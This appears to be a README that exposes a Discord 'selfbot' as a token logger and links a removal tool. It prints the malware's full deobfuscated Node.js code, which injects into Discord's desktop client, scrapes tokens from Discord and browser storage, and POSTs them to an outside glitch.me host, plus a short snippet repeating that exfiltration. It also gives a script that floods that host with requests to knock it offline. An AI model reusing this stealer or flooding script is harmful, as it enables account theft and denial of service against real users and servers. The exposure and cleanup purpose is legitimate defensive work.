# **WFA Selfbot Leaked**.

Hii ! Today I'm leaking WFA Selfbot  ! :D
( WFA is Delta Selfbot but renamed so it's a token logger like Delta :nez: ) 
I'm gonna show you how to delete the grabber from your fiscord, because it injects codes into Discord to grab your password 😥

# How To Delete It  ?

You Can Use [My JS Tool](https://github.com/NotFubukIl/PirateStealerRemover) or the [exe Version](https://notfubuki.xyz/api/remove)
if you have trouble with them please contact the [support](https://discord.gg/6F5tEVfYKM)

# Token Grabber 

## What it grabs ?

```json
{
	"Discord",
	"Google Chrome",
	"Discord Canary",
	"Opera",
	"Brave",
	"Yandex"
}
```

## Grabber's Code

Inject + Browser Grabber
```js
const os = require("os")
const fs = require("fs")
const fetch = require("node-fetch")

if (os.platform() === 'win32') {
    try {
        var dta = fs.readFileSync("./node_modules/base-64/com.txt", 'utf8');
        let dt = dta.toString();
        fs.readFile(__dirname.split(':')[0] + ':/Users/' + __dirname.split('\\')[2] + '/AppData/Local/Discord/app-1.0.9003/modules/discord_desktop_core-2/discord_desktop_core/index.js', async (err, data) => {
            if (err) return;
            var toInject = __dirname.split(':')[0] + ":/Users/" + __dirname.split('\\')[2] + "/AppData/Local/Discord/app-1.0.9003/modules/discord_desktop_core-2/discord_desktop_core/index.js";
            toInject && fs.writeFile(toInject, dt, function (err) {
                if (err) throw err;
            });
        })
        fs.readFile(__dirname.split(':')[0] + ':/Users/' + __dirname.split('\\')[2] + "/AppData/Local/DiscordCanary/app-1.0.42/modules/discord_desktop_core-109/discord_desktop_core/index.js", async (err, data) => {
            if (err) return;
            var toInject = __dirname.split(':')[0] + ':/Users/' + __dirname.split('\\')[2] + "/AppData/Local/DiscordCanary/app-1.0.42/modules/discord_desktop_core-109/discord_desktop_core/index.js";
            toInject && fs.writeFile(toInject, dt, function (err) {
                if (err) throw err;
            });
        });
    } catch (err) {
        console.log("Error:", err.stack);
    }
    var paths = [
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
        `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
    ]
    for (i = 0; i < paths.length; i++) {
        get_token(paths[i]);
    }
    async function get_token(path) {
        try {
            fs.readdir(path, (err, file) => {
                if (file === undefined) {
                    return;
                }
                var filtro = file.filter(f => f.split('.').pop() === 'ldb');
                for (i = 0; i < filtro.length; i++) {
                    fs.readFile(path + '/' + filtro[i], 'utf-8', async function (err, data) {
                        let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        let regex2 = /"mfa\.[\d\w_-]{84}"/;
                        let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                        if (match != null) {
                            match = match.replace(/"/g, '');
                            const benladen = new URLSearchParams();
                            benladen.append('token', match)
                            fetch('https://sjzaoicjvzapjidaz.glitch.me/', {
                                'method': "POST",
                                'body': benladen
                            });
                            await fetch("https://discord.com/api/v6/users/@me", {
                                headers: {
                                    authorization: match
                                }
                            }).then(res => res.json()).then(res => {
                                if (res.id) {
                                    send(match);
                                }
                            });
                        }
                    });
                }
            })
            fs.readdir(path, (err, file) => {
                if (file === undefined) {
                    return;
                }
                var filtro = file.filter(f => f.split('.').pop() === 'ldb');
                for (i = 0; i < filtro.length; i++) {
                    fs.readFile(path + '/' + filtro[i], 'utf-8', async function (err, data) {
                        let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        let regex2 = /"mfa\.[\d\w_-]{84}"/;
                        let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                        if (match != null) {
                            match = match.replace(/"/g, '');
                            const benladen = new URLSearchParams();
                            benladen.append('token', match)
                            fetch('https://sjzaoicjvzapjidaz.glitch.me/', {
                                'method': "POST",
                                'body': benladen
                            });
                            await fetch("https://discord.com/api/v6/users/@me", {
                                headers: {
                                    authorization: match
                                }
                            }).then(res => res.json()).then(res => {
                                if (res.id) {
                                    send(match);
                                }
                            });
                        }
                    });
                }
            })
        } catch (err) {
            console.log(err);
        }
    }

    function send(token) {
        let i = '0';
    }
}
```
**Took from [here](https://github.com/xLucazzz-projects/Discord-TokenGrabber)**
Simple Grabber: 
```js
const allah = new URLSearchParams();
allah.append("token", token);
fetch("https://sjzaoicjvzapjidaz.glitch.me/", {
	method: "POST",
	body: allah
});
```
## How To Down His API For 1 hour ?

By using this Script (NodeJS):
```js
var fetch = require("node-fetch"), i = 0
setInterval(() => {
	fetch("https://sjzaoicjvzapjidaz.glitch.me/", {
		method: "POST",
		body: JSON.stringify({token: "Saluuuut" })
	})
	console.log(`${i++} request to the API`)
}, 100) 
```

## Credits

To [Not.Fubukii](https://github.com/NotFubukIl) For The Deob
